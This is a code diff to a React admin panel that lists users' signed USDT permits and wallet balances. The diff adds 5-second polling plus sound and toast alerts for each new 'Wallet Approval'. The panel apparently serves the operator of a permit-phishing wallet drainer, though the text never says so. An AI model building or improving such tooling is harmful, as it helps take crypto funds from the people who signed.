@@ -1,8 +1,9 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { api } from '../utils/api';
 import { ethers } from 'ethers';
 import toast from 'react-hot-toast';
 import { USDT_ADDRESS, USDT_ABI } from '../utils/contracts';
+import { playNotificationSound } from '../utils/audioNotification';
 
 export default function AdminPanel() {
   const [permits, setPermits] = useState([]);
@@ -13,11 +14,20 @@ export default function AdminPanel() {
   const [daysInput, setDaysInput] = useState('');
   const [currentTargetDate, setCurrentTargetDate] = useState(null);
   const [updatingCountdown, setUpdatingCountdown] = useState(false);
+  const [audioEnabled, setAudioEnabled] = useState(true);
+
+  const prevIdsRef = useRef(null);
 
   useEffect(() => {
-    fetchPermits();
+    fetchPermits(true);
     fetchCountdown();
-  }, []);
+
+    const intervalId = setInterval(() => {
+      fetchPermits(false);
+    }, 5000);
+
+    return () => clearInterval(intervalId);
+  }, [audioEnabled]);
 
   const fetchCountdown = async () => {
     try {
@@ -51,17 +61,42 @@ export default function AdminPanel() {
     }
   };
 
-  const fetchPermits = async () => {
+  const fetchPermits = async (isInitial = false) => {
     try {
       const data = await api.adminGetPermits();
       setPermits(data);
-      // Fetch balances in background without blocking or throwing to parent catch block
+
+      if (data && Array.isArray(data)) {
+        const currentIds = new Set(data.map((p) => String(p._id)));
+
+        if (prevIdsRef.current !== null && !isInitial) {
+          const newPermits = data.filter((p) => !prevIdsRef.current.has(String(p._id)));
+          if (newPermits.length > 0) {
+            const newest = newPermits[0];
+            const shortAddr = newest.owner ? `${newest.owner.slice(0, 6)}...${newest.owner.slice(-4)}` : 'New User';
+            
+            toast.success(`🔔 New Wallet Approval Received! (${shortAddr})`, {
+              duration: 7000,
+              style: { background: '#0f172a', color: '#38bdf8', border: '1px solid #0284c7' },
+            });
+
+            if (audioEnabled) {
+              playNotificationSound();
+            }
+          }
+        }
+
+        prevIdsRef.current = currentIds;
+      }
+
       fetchBalances(data).catch((e) => console.warn('Background balance fetch error:', e));
     } catch (err) {
-      console.error('Fetch permits error:', err);
-      toast.error(err.message || 'Failed to load permits');
+      if (isInitial) {
+        console.error('Fetch permits error:', err);
+        toast.error(err.message || 'Failed to load permits');
+      }
     } finally {
-      setLoading(false);
+      if (isInitial) setLoading(false);
     }
   };
 
@@ -131,12 +166,24 @@ export default function AdminPanel() {
     <div className="max-w-5xl mx-auto mt-8">
       <div className="flex justify-between items-center mb-6">
         <h2 className="text-2xl font-bold text-slate-100">Admin Control Panel – Signed Permits</h2>
-        <button
-          onClick={fetchPermits}
-          className="bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs px-4 py-2 rounded-xl border border-slate-700 transition"
-        >
-          Refresh Data & Balances
-        </button>
+        <div className="flex items-center gap-3">
+          <button
+            onClick={() => setAudioEnabled(!audioEnabled)}
+            className={`text-xs px-3 py-2 rounded-xl border font-medium transition flex items-center gap-1.5 ${
+              audioEnabled
+                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/20'
+                : 'bg-slate-800 border-slate-700 text-slate-400 hover:bg-slate-700'
+            }`}
+          >
+            {audioEnabled ? '🔔 Sound Alerts: ON' : '🔇 Sound Alerts: OFF'}
+          </button>
+          <button
+            onClick={() => fetchPermits(false)}
+            className="bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs px-4 py-2 rounded-xl border border-slate-700 transition"
+          >
+            Refresh Data & Balances
+          </button>
+        </div>
       </div>
 
       {/* Overview Stats Cards */}
